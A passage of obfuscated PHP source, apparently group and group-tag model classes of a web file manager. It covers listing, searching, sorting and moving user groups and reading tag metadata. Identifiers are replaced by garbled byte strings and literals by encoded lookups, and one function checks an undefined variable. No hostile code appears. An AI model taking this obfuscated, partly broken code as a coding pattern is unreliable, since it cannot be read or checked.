$this->where(array($¦¬ª…á»[193] => $ØÌß÷ş))->save(array($¦¬ª…á»[193] => $˜Ê‘Ñ¼¡[$¦¬ª…á»[193]])); $this->_clearCache($Î°ÂËã[$¦¬ª…á»[1953]]); } Model($¦¬ª…á»[2047])->where($˜ÎèÈë—)->delete(); Model($¦¬ª…á»[2048])->where($˜ÎèÈë—)->delete(); Model($¦¬ª…á»[875])->groupRootRemove($ØÌß÷ş); $this->_clearCache($˜Ê‘Ñ¼¡[$¦¬ª…á»[193]]); return $this->where($˜ÎèÈë—)->delete(); } protected function groupSort($ÉÂğ‘µ) { $öºÚŞŒÛ =& $_SERVER[Õò”†—·]; $ÇØëç½£ = array(); foreach ($ÉÂğ‘µ as $©Íüı­’ => $¿¦ğæ½Ş) { $ÇØëç½£[] = array($öºÚŞŒÛ[1953], $¿¦ğæ½Ş, $öºÚŞŒÛ[1977], $©Íüı­’ + 1); } $this->saveAll($ÇØëç½£); } public function listData() { $ÄÂÎËªÒ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÄÂÎËªÒ[$_SERVER[Õò”†—·][429]]); return $ÄÂÎËªÒ; } private function _makeOrder($£Áú›²¼ = '') { $µÎª¹Ó¤ =& $_SERVER[Õò”†—·]; $ûÑï–‰É = array($µÎª¹Ó¤[1953], $µÎª¹Ó¤[42], $µÎª¹Ó¤[1942], $µÎª¹Ó¤[232]); $œ®•ü€ = array($µÎª¹Ó¤[507] => $µÎª¹Ó¤[508], $µÎª¹Ó¤[509] => $µÎª¹Ó¤[510]); $âÍã ø¥ = Input::get($µÎª¹Ó¤[514], $µÎª¹Ó¤[17], $µÎª¹Ó¤[1957], $ûÑï–‰É); $ÉµôÍêà = Input::get($µÎª¹Ó¤[515], $µÎª¹Ó¤[17], $µÎª¹Ó¤[2049], array($µÎª¹Ó¤[2049], $µÎª¹Ó¤[509])); $ÉµôÍêà = $œ®•ü€[$ÉµôÍêà]; $£Áú›²¼ = $£Áú›²¼ . "{$âÍã ø¥}\40{$ÉµôÍêà}\x2c\40\x67\162\157\165\x70\x49\x44\x20\141\x73\143"; return $this->order($£Áú›²¼); } public function listChild($•›óÁÆŞ) { $É¨ÊûÏ² =& $_SERVER[Õò”†—·]; $ËšÕÈçŞ = $this->where(array($É¨ÊûÏ²[193] => $•›óÁÆŞ))->_makeOrder()->selectPage(200); $this->_listDataApply($ËšÕÈçŞ[$É¨ÊûÏ²[429]]); return $ËšÕÈçŞ; } public function listChildIds($Äô£²Õ) { $šÇ¤âû¶ =& $_SERVER[Õò”†—·]; if (is_string($ƒˆ“¨‘“)) { $Äô£²Õ = explode($šÇ¤âû¶[60], $Äô£²Õ); } $Œ˜Æç‡Ú = $this->where(array($šÇ¤âû¶[1953] => array($šÇ¤âû¶[17], $Äô£²Õ)))->field($šÇ¤âû¶[2050])->select(); if (!$Œ˜Æç‡Ú) { return !1; } $ì‚§â¶Ë = array(); foreach ($Œ˜Æç‡Ú as $¦î—ñ) { $ì‚§â¶Ë[] = "\163\x65\154\145\143\x74\40\x67\x72\x6f\165\x70\x49\104\x20\x66\x72\157\155\40\140\x67\x72\x6f\x75\x70\140\40\167\x68\145\162\145\40\160\141\162\x65\156\x74\114\145\x76\x65\x6c\x20\x6c\x69\x6b\x65\x20\x27{$¦î—ñ[$šÇ¤âû¶[569]]}{$¦î—ñ[$šÇ¤âû¶[1953]]}\54\45\47"; } $ì‚§â¶Ë = implode($šÇ¤âû¶[2051], $ì‚§â¶Ë); $Œ˜Æç‡Ú = $this->query($ì‚§â¶Ë); if (!$Œ˜Æç‡Ú) { return array(); } $Äô£²Õ = array_to_keyvalue($Œ˜Æç‡Ú, $šÇ¤âû¶[22], $šÇ¤âû¶[1953]); return array_unique($Äô£²Õ); } public function listByID($Íóà¡âÅ) { $ÄÅ‡Åê— =& $_SERVER[Õò”†—·]; if (!$Íóà¡âÅ) { return array(); } $ŒÅ­†‡â = array($ÄÅ‡Åê—[1953] => array($ÄÅ‡Åê—[17], $Íóà¡âÅ)); $»Ÿà™ıÔ = $this->where($ŒÅ­†‡â)->select(); $»Ÿà™ıÔ = array_sort_keep($»Ÿà™ıÔ, $ÄÅ‡Åê—[1953], $Íóà¡âÅ); $this->_listDataApply($»Ÿà™ıÔ); return $»Ÿà™ıÔ; } public function listSearch($üØç»¬Ş) { $È»‘Ãê¿ =& $_SERVER[Õò”†—·]; $ÅÇ®äœ‘ = trim($üØç»¬Ş[$È»‘Ãê¿[2052]]); $ıÛË²÷ú = explode($È»‘Ãê¿[63], $ÅÇ®äœ‘); if (!$ÅÇ®äœ‘ || count($ıÛË²÷ú) == 1) { return $this->listSearchNow($üØç»¬Ş); } $Ò¨‰õŸé = array($È»‘Ãê¿[429] => array()); foreach ($ıÛË²÷ú as $ù»Ï±‹) { if (!trim($ù»Ï±‹)) { continue; } $üØç»¬Ş[$È»‘Ãê¿[2052]] = $ù»Ï±‹; $±©ÂÂåß = $this->listSearchNow($üØç»¬Ş); $Ò¨‰õŸé[$È»‘Ãê¿[429]] = array_merge($Ò¨‰õŸé[$È»‘Ãê¿[429]], $±©ÂÂåß[$È»‘Ãê¿[429]]); } $Ò¨‰õŸé[$È»‘Ãê¿[429]] = array_unique_by_key($Ò¨‰õŸé[$È»‘Ãê¿[429]], $È»‘Ãê¿[1953]); $Ò¨‰õŸé[$È»‘Ãê¿[426]] = array($È»‘Ãê¿[427] => count($Ò¨‰õŸé[$È»‘Ãê¿[429]]), $È»‘Ãê¿[423] => 20, $È»‘Ãê¿[413] => 1, $È»‘Ãê¿[428] => 1); return $Ò¨‰õŸé; } public function listSearchNow($Š½¢¬È) { $Ì™ŸŞûì =& $_SERVER[Õò”†—·]; $Ï¸ŒŠ‚ù = trim($Š½¢¬È[$Ì™ŸŞûì[2052]]); $¨ˆ’íµ = isset($Š½¢¬È[$Ì™ŸŞûì[2053]]) ? $Š½¢¬È[$Ì™ŸŞûì[2053]] : !1; if (!trim($Ï¸ŒŠ‚ù)) { return !1; } $Ï¸ŒŠ‚ù = str_replace($Ì™ŸŞûì[2054], $Ì™ŸŞûì[2055], $Ï¸ŒŠ‚ù); $½¸Ë³İî = array($Ì™ŸŞûì[1953] => array($Ì™ŸŞûì[443], "{$Ï¸ŒŠ‚ù}\45"), $Ì™ŸŞûì[42] => array($Ì™ŸŞûì[443], "\x25{$Ï¸ŒŠ‚ù}\x25"), $Ì™ŸŞûì[1050] => $Ì™ŸŞûì[2056]); if ($¨ˆ’íµ) { $íõëËÎà = $this->getInfoSimple($¨ˆ’íµ); $Ûø×¨â = $íõëËÎà[$Ì™ŸŞûì[569]] . $¨ˆ’íµ . $Ì™ŸŞûì[597]; $½¸Ë³İî = array($½¸Ë³İî, array($Ì™ŸŞûì[569] => array($Ì™ŸŞûì[443], $Ûø×¨â))); } $½¸Ë³İî = $this->parseWhereLike($½¸Ë³İî); $¤¤€ ş = $this->_makeOrder()->where($½¸Ë³İî)->selectPage(20); $¤¤€ ş = $¤¤€ ş ? $¤¤€ ş : array($Ì™ŸŞûì[429] => array(), $Ì™ŸŞûì[426] => array()); if (!$¤¤€ ş || count($¤¤€ ş[$Ì™ŸŞûì[429]]) < 5 && Input::check($Ï¸ŒŠ‚ù, $Ì™ŸŞûì[378])) { $‚Íã­Òğ = $this->groupChildrenAll($¨ˆ’íµ); $èŸŞîá = $this->_searchFromMeta($Ì™ŸŞûì[521], $Ï¸ŒŠ‚ù, 10, $‚Íã­Òğ); $¤ªİíî¬ = $this->_searchFromMeta($Ì™ŸŞûì[522], $Ï¸ŒŠ‚ù, 10, $‚Íã­Òğ); $Òğç…ÖË = array_merge($èŸŞîá, $¤ªİíî¬, $¤¤€ ş[$Ì™ŸŞûì[429]]); $¤¤€ ş[$Ì™ŸŞûì[429]] = array_unique_by_key($Òğç…ÖË, $Ì™ŸŞûì[1953]); $¤¤€ ş[$Ì™ŸŞûì[426]][$Ì™ŸŞûì[427]] = count($¤¤€ ş[$Ì™ŸŞûì[429]]); $¤¤€ ş[$Ì™ŸŞûì[426]][$Ì™ŸŞûì[428]] = ceil($¤¤€ ş[$Ì™ŸŞûì[426]][$Ì™ŸŞûì[427]] / $¤¤€ ş[$Ì™ŸŞûì[426]][$Ì™ŸŞûì[423]]); } $this->_listDataApply($¤¤€ ş[$Ì™ŸŞûì[429]]); return $¤¤€ ş; } protected function groupChildrenAll($±ƒ‘é¥â) { $„Ä§µÜì =& $_SERVER[Õò”†—·]; if (!$±ƒ‘é¥â) { return !1; } if (!is_array($±ƒ‘é¥â)) { $±ƒ‘é¥â = array($±ƒ‘é¥â); } $Áå…Ü“Ø = $±ƒ‘é¥â; foreach ($±ƒ‘é¥â as $©îã’å‹) { $˜šßŸ«ì = $this->getInfoSimple($©îã’å‹); $«§…ôÁÄ = array($„Ä§µÜì[569] => array($„Ä§µÜì[443], $˜šßŸ«ì[$„Ä§µÜì[569]] . $©îã’å‹ . $„Ä§µÜì[597])); $æÁÉÃÜ = $this->field($„Ä§µÜì[1953])->where($«§…ôÁÄ)->select(); $Áå…Ü“Ø = array_merge($Áå…Ü“Ø, array_to_keyvalue($æÁÉÃÜ, $„Ä§µÜì[22], $„Ä§µÜì[1953])); } return array_unique($Áå…Ü“Ø); } private function _searchFromMeta($Ìç× Î¹, $àèÂ¸é, $ô‰¾ØÎ—, $è°ê­ó€) { $¯…ë÷âÑ =& $_SERVER[Õò”†—·]; $àèÂ¸é = strtolower($àèÂ¸é); $àìş = array($¯…ë÷âÑ[107] => $Ìç× Î¹, $¯…ë÷âÑ[434] => array($¯…ë÷âÑ[443], "\45{$àèÂ¸é}\x25")); $àìş = $this->parseWhereLike($àìş); if ($è°ê­ó€) { $àìş[$¯…ë÷âÑ[1953]] = array($¯…ë÷âÑ[17], $è°ê­ó€); } $—±£»îÃ = Model($¯…ë÷âÑ[2057])->where($àìş)->limit($ô‰¾ØÎ—)->select(); if (!$—±£»îÃ) { return array(); } $—±£»îÃ = array_to_keyvalue($—±£»îÃ, $¯…ë÷âÑ[22], $¯…ë÷âÑ[1953]); $‰ÑÉ«ãĞ = $this->where(array($¯…ë÷âÑ[2046] => array($¯…ë÷âÑ[17], $—±£»îÃ)))->select(); if (!$‰ÑÉ«ãĞ) { return array(); } return $‰ÑÉ«ãĞ; } protected function _listDataApplyItem($²íô´Ôğ) { $ØÛæï“ = array($²íô´Ôğ); $this->_listDataApply($ØÛæï“); return $ØÛæï“[0]; } protected function _listDataApply(&$³‰•ææ) { $şã–ğ§º =& $_SERVER[Õò”†—·]; if (!$³‰•ææ) { return; } $™ÙÅß·Î = array_to_keyvalue($³‰•ææ, $şã–ğ§º[22], $şã–ğ§º[1953]); $this->_listAppendChildren($³‰•ææ); $this->_listAppendChildrenMember($³‰•ææ); $this->_listAppendMeta($³‰•ææ, $™ÙÅß·Î); $this->_listAppendParent($³‰•ææ); $this->_listAppendSourceRoot($³‰•ææ, $™ÙÅß·Î); } private function _listAppendChildren(&$šˆ¢Ïù) { $Å¢š ÛÚ =& $_SERVER[Õò”†—·]; $ŠĞÜşé = array_to_keyvalue($šˆ¢Ïù, $Å¢š ÛÚ[22], $Å¢š ÛÚ[1953]); $Õ®•¦ = array($Å¢š ÛÚ[193] => array($Å¢š ÛÚ[17], $ŠĞÜşé)); $š Ş×„Ô = array($Å¢š ÛÚ[193], $Å¢š ÛÚ[2058] => $Å¢š ÛÚ[550]); $ç©×º•Æ = $this->field($š Ş×„Ô)->where($Õ®•¦)->group($Å¢š ÛÚ[193])->select(); $¶ƒù‰½ = array_to_keyvalue($ç©×º•Æ, $Å¢š ÛÚ[193], $Å¢š ÛÚ[550]); foreach ($šˆ¢Ïù as &$¶œó¦“Ö) { $øÑô‰®é = $¶œó¦“Ö[$Å¢š ÛÚ[1953]]; $¶œó¦“Ö[$Å¢š ÛÚ[2059]] = isset($¶ƒù‰½[$øÑô‰®é]) ? intval($¶ƒù‰½[$øÑô‰®é]) : !1; } unset($¶œó¦“Ö); } private function _listAppendChildrenMember(&$·“‚ßçâ) { $òÍ¹Şş£ =& $_SERVER[Õò”†—·]; $¬¼ş© = array_to_keyvalue($·“‚ßçâ, $òÍ¹Şş£[22], $òÍ¹Şş£[1953]); $İ÷Æ¤ÂÏ = array($òÍ¹Şş£[1953] => array($òÍ¹Şş£[17], $¬¼ş©)); $¸óÀçÀ  = array($òÍ¹Şş£[1953], $òÍ¹Şş£[2058] => $òÍ¹Şş£[550]); $úü±·ÈÒ = Model($òÍ¹Şş£[2048])->field($¸óÀçÀ )->where($İ÷Æ¤ÂÏ)->group($òÍ¹Şş£[1953])->select(); $·³éêÆæ = array_to_keyvalue($úü±·ÈÒ, $òÍ¹Şş£[1953], $òÍ¹Şş£[550]); foreach ($·“‚ßçâ as &$ìÁœ•‹ğ) { $»€Áæ = $ìÁœ•‹ğ[$òÍ¹Şş£[1953]]; $ìÁœ•‹ğ[$òÍ¹Şş£[2060]] = isset($·³éêÆæ[$»€Áæ]) ? intval($·³éêÆæ[$»€Áæ]) : !1; } unset($ìÁœ•‹ğ); } private function _listAppendMeta(&$»ªôÚ—ğ, $úˆ×í¤ö) { $İäÇÇæ =& $_SERVER[Õò”†—·]; $şšƒÏ¾ = array($İäÇÇæ[1953] => array($İäÇÇæ[17], $úˆ×í¤ö)); $ø§Œ²±± = Model($İäÇÇæ[2047])->where($şšƒÏ¾)->select(); $ø§Œ²±± = array_to_keyvalue_group($ø§Œ²±±, $İäÇÇæ[1953]); foreach ($ø§Œ²±± as &$·Ç¹ãåÛ) { $·Ç¹ãåÛ = array_to_keyvalue($·Ç¹ãåÛ, $İäÇÇæ[107], $İäÇÇæ[434]); } unset($·Ç¹ãåÛ); foreach ($»ªôÚ—ğ as &$¡É®Öã) { $¡É®Öã[$İäÇÇæ[523]] = array(); if (isset($ø§Œ²±±[$¡É®Öã[$İäÇÇæ[1953]]])) { $¡É®Öã[$İäÇÇæ[523]] = $ø§Œ²±±[$¡É®Öã[$İäÇÇæ[1953]]]; } } unset($¡É®Öã); } protected function parentLevelArray($Ê¢•Í¼Ë) { $ğƒúİæ =& $_SERVER[Õò”†—·]; $Ê¢•Í¼Ë = explode($ğƒúİæ[60], trim($Ê¢•Í¼Ë, $ğƒúİæ[60])); $Ê¢•Í¼Ë = array_remove_value($Ê¢•Í¼Ë, $ğƒúİæ[229]); return $Ê¢•Í¼Ë; } protected function parentInGroup($Ë…ÎÂø, $ÛÕá„‰Œ) { $Û¢šÑÙÀ =& $_SERVER[Õò”†—·]; $¾Ø”úîò = $this->getInfoSimple($Ë…ÎÂø); if (!$¾Ø”úîò) { return !0; } $‹±éñù° = $this->parentLevelArray($¾Ø”úîò[$Û¢šÑÙÀ[569]]); $‹±éñù°[] = $Ë…ÎÂø; foreach ($‹±éñù° as $Ë…ÎÂø) { if (in_array($Ë…ÎÂø . $Û¢šÑÙÀ[22], $ÛÕá„‰Œ)) { return !0; } } return !1; } private function _listAppendParent(&$ã™ÏŞ÷…) { $ğÜÂäÜ =& $_SERVER[Õò”†—·]; $¯ïƒòÔê = array(); foreach ($ã™ÏŞ÷… as &$Ú¦ÉÄ‰ş) { $¯ïƒòÔê[$Ú¦ÉÄ‰ş[$ğÜÂäÜ[1953]]] = $Ú¦ÉÄ‰ş[$ğÜÂäÜ[42]]; $“‡¯¶ÓÌ = $this->parentLevelArray($Ú¦ÉÄ‰ş[$ğÜÂäÜ[569]]); foreach ($“‡¯¶ÓÌ as $‡á ş×ô) { if (!isset($¯ïƒòÔê[$‡á ş×ô])) { $¯ïƒòÔê[$‡á ş×ô] = 0; } } } unset($Ú¦ÉÄ‰ş); foreach ($¯ïƒòÔê as $˜ˆ©ûê‹ => $Î·ÆÆ»¶) { if ($Î·ÆÆ»¶) { continue; } $ä¶ú»àğ = $this->getInfoSimple($˜ˆ©ûê‹); $¯ïƒòÔê[$˜ˆ©ûê‹] = $ä¶ú»àğ[$ğÜÂäÜ[42]]; } $€¨–¹§® = $GLOBALS[$ğÜÂäÜ[16]][$ğÜÂäÜ[102]][$ğÜÂäÜ[2061]]; if (KodUser::isRoot()) { $€¨–¹§® = !1; } foreach ($ã™ÏŞ÷… as &$Ú¦ÉÄ‰ş) { $“‡¯¶ÓÌ = $this->parentLevelArray($Ú¦ÉÄ‰ş[$ğÜÂäÜ[569]]); $Åä¸¿° = $ğÜÂäÜ[22]; foreach ($“‡¯¶ÓÌ as $˜ˆ©ûê‹ => $‡á ş×ô) { if ($€¨–¹§® && $˜ˆ©ûê‹ == 0) { continue; } $Åä¸¿° .= $¯ïƒòÔê[$‡á ş×ô] . $ğÜÂäÜ[18]; } if ($“‡¯¶ÓÌ) { $Åä¸¿° .= $Ú¦ÉÄ‰ş[$ğÜÂäÜ[42]]; } $Ú¦ÉÄ‰ş[$ğÜÂäÜ[574]] = str_replace($ğÜÂäÜ[577], $ğÜÂäÜ[18], $Åä¸¿°); } unset($Ú¦ÉÄ‰ş); } private function _listAppendSourceRoot(&$íáöŒ¸Å, $×ÃÂ˜©È) { $·Ù‰úÄ =& $_SERVER[Õò”†—·]; $ëñïÉ§œ = Model($·Ù‰úÄ[875])->listSourceRoot(SourceModel::TYPE_GROUP, $×ÃÂ˜©È); $ëñïÉ§œ = array_to_keyvalue($ëñïÉ§œ, $·Ù‰úÄ[554]); $ëñïÉ§œ = array_remove_key($ëñïÉ§œ, $·Ù‰úÄ[554]); foreach ($íáöŒ¸Å as &$Åñ­®¨²) { $Åñ­®¨²[$·Ù‰úÄ[100]] = $ëñïÉ§œ[$Åñ­®¨²[$·Ù‰úÄ[1953]]] ? $ëñïÉ§œ[$Åñ­®¨²[$·Ù‰úÄ[1953]]] : array(); } unset($Åñ­®¨²); } protected function groupMerge($¯åÃıµ) { $¯åÃıµ = array_values(array_unique($¯åÃıµ)); $×áŞÖ— = array(); for ($Ùğ«¶÷ = 0; $Ùğ«¶÷ < count($¯åÃıµ); $Ùğ«¶÷++) { $Áâ†¥¸· = !1; for ($Ş‡ö„ß¨ = 0; $Ş‡ö„ß¨ < count($¯åÃıµ); $Ş‡ö„ß¨++) { if ($Ùğ«¶÷ == $Ş‡ö„ß¨) { continue; } if ($this->isParentOf($¯åÃıµ[$Ş‡ö„ß¨], $¯åÃıµ[$Ùğ«¶÷])) { $Áâ†¥¸· = !0; break; } } if (!$Áâ†¥¸·) { $×áŞÖ—[] = $¯åÃıµ[$Ùğ«¶÷]; } } return $×áŞÖ—; } protected function isParentOf($ßŒĞ‰Â, $ËŞô­Ñä) { $òê‰´„ =& $_SERVER[Õò”†—·]; if (!$ßŒĞ‰Â || !$ËŞô­Ñä || $ßŒĞ‰Â == $ËŞô­Ñä) { return !1; } $½Ù­¤èø = $this->getInfoSimple($ßŒĞ‰Â); $™ÆãÂ = $this->getInfoSimple($ËŞô­Ñä); $©ÄÊò¬Ò = $½Ù­¤èø[$òê‰´„[569]] . $ßŒĞ‰Â . $òê‰´„[60]; if (substr($™ÆãÂ[$òê‰´„[569]], 0, strlen($©ÄÊò¬Ò)) == $©ÄÊò¬Ò) { return !0; } return !1; } public function groupShowRoot($Ë®°³åÀ, $èæ™¿ = false) { $Šºç£´Æ =& $_SERVER[Õò”†—·]; $ƒÆÃ·ò¯ = $this->getInfo($Ë®°³åÀ); if (!$ƒÆÃ·ò¯) { return array(); } $¿èïèšÔ = $this->parentLevelArray($ƒÆÃ·ò¯[$Šºç£´Æ[569]]); $èöêŞÛÑ = array($Ë®°³åÀ); if (count($¿èïèšÔ) == 0) { return $èöêŞÛÑ; } if ($èæ™¿ && count($¿èïèšÔ) == 1) { return $èöêŞÛÑ; } if (!$ƒÆÃ·ò¯[$Šºç£´Æ[523]] || !isset($ƒÆÃ·ò¯[$Šºç£´Æ[523]][$Šºç£´Æ[2044]]) || $ƒÆÃ·ò¯[$Šºç£´Æ[523]][$Šºç£´Æ[2044]] == $Šºç£´Æ[2009]) { return $this->groupShowRoot($¿èïèšÔ[count($¿èïèšÔ) - 1], $èæ™¿); } if ($ƒÆÃ·ò¯[$Šºç£´Æ[523]][$Šºç£´Æ[2044]] == $Šºç£´Æ[417]) { $¸æ˜î¶ = explode($Šºç£´Æ[60], $ƒÆÃ·ò¯[$Šºç£´Æ[523]][$Šºç£´Æ[2045]]); if ($¸æ˜î¶) { $èöêŞÛÑ = array_merge($èöêŞÛÑ, $¸æ˜î¶); } } return $èöêŞÛÑ; } protected function resetParentLevel() { $úÕ˜·è  =& $_SERVER[Õò”†—·]; $ÊÌÆÍã¦ = $úÕ˜·è [1953]; $Çç¾Ûìë = $this->select(); $Çç¾Ûìë = array_to_keyvalue($Çç¾Ûìë, $ÊÌÆÍã¦); foreach ($Çç¾Ûìë as $•¦²¾éç) { $Ïå³µ™¦ = $•¦²¾éç; $ñùˆ‹Êı = array(); while ($Ïå³µ™¦[$úÕ˜·è [193]] != 0) { $ñùˆ‹Êı[] = $Ïå³µ™¦[$úÕ˜·è [193]]; $Ïå³µ™¦ = $Çç¾Ûìë[$Ïå³µ™¦[$úÕ˜·è [193]]]; } $ñùˆ‹Êı[] = 0; $ñùˆ‹Êı = $úÕ˜·è [60] . implode($úÕ˜·è [60], array_reverse($ñùˆ‹Êı)) . $úÕ˜·è [60]; $this->setNamePinyin($•¦²¾éç[$ÊÌÆÍã¦], $•¦²¾éç[$úÕ˜·è [42]]); $this->where(array($ÊÌÆÍã¦ => $•¦²¾éç[$ÊÌÆÍã¦]))->save(array($úÕ˜·è [636] => $ñùˆ‹Êı)); } return $Çç¾Ûìë; } public function groupNameAuto($õÈ® ×, $ı¦â²åª) { $Åªº’Ó¾ =& $_SERVER[Õò”†—·]; $ÇáÕ­Òí = $this->where(array($Åªº’Ó¾[461] => $õÈ® ×))->getField($Åªº’Ó¾[42], !0); if (!$ÇáÕ­Òí || !in_array($ı¦â²åª, $ÇáÕ­Òí)) { return $ı¦â²åª; } for ($š“ü·ËÎ = 1; $š“ü·ËÎ <= count($ÇáÕ­Òí) + 1; $š“ü·ËÎ++) { $à²´½Šö = $ı¦â²åª . "\50{$š“ü·ËÎ}\x29"; if (!in_array($à²´½Šö, $ÇáÕ­Òí)) { return $à²´½Šö; } } } public function groupSwitch($á„µ ó¤, $ø®âÇ¸˜) { $‹ˆñÄÚ =& $_SERVER[Õò”†—·]; $ì”ßäÄİ = array($‹ˆñÄÚ[1953] => array($‹ˆñÄÚ[17], array($á„µ ó¤, $ø®âÇ¸˜))); $©­®ı³‘ = $this->where($ì”ßäÄİ)->select(); $©­®ı³‘ = array_to_keyvalue($©­®ı³‘, $‹ˆñÄÚ[1953]); if (!isset($©­®ı³‘[$á„µ ó¤]) || !isset($©­®ı³‘[$ø®âÇ¸˜]) || $©­®ı³‘[$á„µ ó¤][$‹ˆñÄÚ[193]] == 0) { return !1; } $ì”ßäÄİ = array($‹ˆñÄÚ[1953] => $á„µ ó¤); $î‡Š³ê¬ = Model($‹ˆñÄÚ[2048])->where($ì”ßäÄİ)->select(); if (!$î‡Š³ê¬) { $î‡Š³ê¬ = array(); } foreach ($î‡Š³ê¬ as $Ç›äˆÜ¦) { $Ú™Óñ´ = $Ç›äˆÜ¦[$‹ˆñÄÚ[1755]]; $ì”ßäÄİ = array($‹ˆñÄÚ[1755] => $Ú™Óñ´, $‹ˆñÄÚ[1953] => $ø®âÇ¸˜); $Šš„¦í = Model($‹ˆñÄÚ[2048])->where($ì”ßäÄİ)->find(); if (!$Šš„¦í) { $ª²åœ»î = array($ø®âÇ¸˜ => $Ç›äˆÜ¦[$‹ˆñÄÚ[2062]]); Model($‹ˆñÄÚ[583])->userGroupAdd($Ú™Óñ´, $ª²åœ»î); } Model($‹ˆñÄÚ[583])->userGroupRemove($Ú™Óñ´, $á„µ ó¤); } $ì”ßäÄİ = array($‹ˆñÄÚ[191] => 2, $‹ˆñÄÚ[193] => 0, $‹ˆñÄÚ[469] => 1, $‹ˆñÄÚ[554] => array($‹ˆñÄÚ[17], array($á„µ ó¤, $ø®âÇ¸˜))); $“‚Ç¬¦ï = Model($‹ˆñÄÚ[875])->where($ì”ßäÄİ)->field($‹ˆñÄÚ[2063])->select(); $“‚Ç¬¦ï = array_to_keyvalue($“‚Ç¬¦ï, $‹ˆñÄÚ[554], $‹ˆñÄÚ[194]); $Éµ’áõ = !empty($“‚Ç¬¦ï[$á„µ ó¤]) ? $“‚Ç¬¦ï[$á„µ ó¤] : !1; if ($Éµ’áõ) { if (!$“‚Ç¬¦ï[$ø®âÇ¸˜]) { $“‚Ç¬¦ï[$ø®âÇ¸˜] = Model($‹ˆñÄÚ[875])->groupRootAdd($ø®âÇ¸˜); } $•ÔıÛõâ = $“‚Ç¬¦ï[$ø®âÇ¸˜]; $ì”ßäÄİ = array($‹ˆñÄÚ[193] => $Éµ’áõ); $“‚Ç¬¦ï = Model($‹ˆñÄÚ[875])->where($ì”ßäÄİ)->field($‹ˆñÄÚ[2064])->select(); if (!$“‚Ç¬¦ï) { $“‚Ç¬¦ï = array(); } Model($‹ˆñÄÚ[875])->moveClearAuth = !1; foreach ($“‚Ç¬¦ï as $²¯Ã‰Êø) { $ÅÂêÙ¶ô = $²¯Ã‰Êø[$‹ˆñÄÚ[469]] == $‹ˆñÄÚ[101] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($‹ˆñÄÚ[875])->move($²¯Ã‰Êø[$‹ˆñÄÚ[194]], $•ÔıÛõâ, $ÅÂêÙ¶ô); } Model($‹ˆñÄÚ[875])->moveClearAuth = !0; $ì”ßäÄİ = array($‹ˆñÄÚ[191] => 2, $‹ˆñÄÚ[554] => $á„µ ó¤); $¿éîöÆ = array($‹ˆñÄÚ[554] => $ø®âÇ¸˜); Model($‹ˆñÄÚ[2065])->where($ì”ßäÄİ)->save($¿éîöÆ); Model($‹ˆñÄÚ[2066])->where($ì”ßäÄİ)->save($¿éîöÆ); } $this->_changeChildLevel($©­®ı³‘[$á„µ ó¤], $©­®ı³‘[$ø®âÇ¸˜], !0); $this->where(array($‹ˆñÄÚ[193] => $á„µ ó¤))->save(array($‹ˆñÄÚ[193] => $ø®âÇ¸˜)); $this->_clearChildrenCache($©­®ı³‘[$ø®âÇ¸˜]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\137\146\x61\x76"; protected function cacheFunctionAlias($…„ğÜù) { $…Æ„ª¤ =& $_SERVER[Õò”†—·]; return array($…Æ„ª¤[2067] => array($…„ğÜù[0], $…Æ„ª¤[2068]), $…Æ„ª¤[2069] => array($…„ğÜù[0], $…Æ„ª¤[2070])); } protected function get($ÛêìĞğ) { $Èö²‡‰µ =& $_SERVER[Õò”†—·]; $¡»ë»­ = Model($Èö²‡‰µ[570])->metaGet($ÛêìĞğ, $Èö²‡‰µ[2071]); $ê±µªİÃ = json_decode($¡»ë»­, !0); return $ê±µªİÃ ? $ê±µªİÃ : array($Èö²‡‰µ[2072] => $Èö²‡‰µ[101], $Èö²‡‰µ[429] => array()); } protected function set($²ïÇôîì, $«¹Ìû½Ö) { $ğÖ¡ƒİš =& $_SERVER[Õò”†—·]; $«¹Ìû½Ö = $«¹Ìû½Ö ? $«¹Ìû½Ö : array($ğÖ¡ƒİš[2072] => $ğÖ¡ƒİš[101], $ğÖ¡ƒİš[429] => array()); return Model($ğÖ¡ƒİš[570])->metaSet($²ïÇôîì, $ğÖ¡ƒİš[2071], json_encode($«¹Ìû½Ö)); } protected function getByTagID($ÖŒßı²©, $šï§Â¡İ) { $ÏÍ°ù =& $_SERVER[Õò”†—·]; if (!$ÖŒßı²© || !$šï§Â¡İ) { return !1; } if (!Model($ÏÍ°ù[570])->getInfoSimple($ÖŒßı²©)) { return !1; } $ÅàîËÁ… = $this->get($ÖŒßı²©); if (!$ÅàîËÁ… || !isset($ÅàîËÁ…[$ÏÍ°ù[429]])) { return !1; } $…ÙûèûÜ = array_find_by_field($ÅàîËÁ…[$ÏÍ°ù[429]], $ÏÍ°ù[459], $šï§Â¡İ); return is_array($…ÙûèûÜ) ? $…ÙûèûÜ : !1; } public function listSource($¯ûùÉ¦º, $ ùâË²å) { $Í‘„Ôƒ =& $_SERVER[Õò”†—·]; if ($ ùâË²å && !is_array($ ùâË²å)) { $ ùâË²å = array($ ùâË²å); } $Éå§ÌâÌ = $this->listData($¯ûùÉ¦º); $­ÔÛƒ’Ì = array(); foreach ($Éå§ÌâÌ as $ú©µâ‘ì) { $ñõŒü‘Ñ = $ú©µâ‘ì[$Í‘„Ôƒ[97]]; if (!$ñõŒü‘Ñ) { continue; } if (!isset($­ÔÛƒ’Ì[$ñõŒü‘Ñ])) { $­ÔÛƒ’Ì[$ñõŒü‘Ñ] = array(); } $­ÔÛƒ’Ì[$ñõŒü‘Ñ][] = $ú©µâ‘ì[$Í‘„Ôƒ[484]]; } $Ä¬«„´± = array(); foreach ($­ÔÛƒ’Ì as $Àù¹·Œ => $®ÏÖÃÒ„) { $§ë”“äÂ = !0; if (!$ ùâË²å) { $Ä¬«„´±[] = $Àù¹·Œ; continue; } foreach ($ ùâË²å as $Öå¿‚±¥) { if (!in_array($Öå¿‚±¥, $®ÏÖÃÒ„)) { $§ë”“äÂ = !1; break; } } if ($§ë”“äÂ) { $Ä¬«„´±[] = $Àù¹·Œ; } } if (!$Ä¬«„´±) { return array(); } $Ğª›ï‡ = array($Í‘„Ôƒ[475] => array($Í‘„Ôƒ[476], $Ä¬«„´±), $Í‘„Ôƒ[554] => $¯ûùÉ¦º, $Í‘„Ôƒ[191] => SourceModel::TYPE_GROUP); $çó™Ä¢ = Model($Í‘„Ôƒ[1388])->listSource($Ğª›ï‡); if (!$çó™Ä¢ || count($Ä¬«„´±) == $çó™Ä¢[$Í‘„Ôƒ[426]][$Í‘„Ôƒ[427]]) { return $çó™Ä¢; } 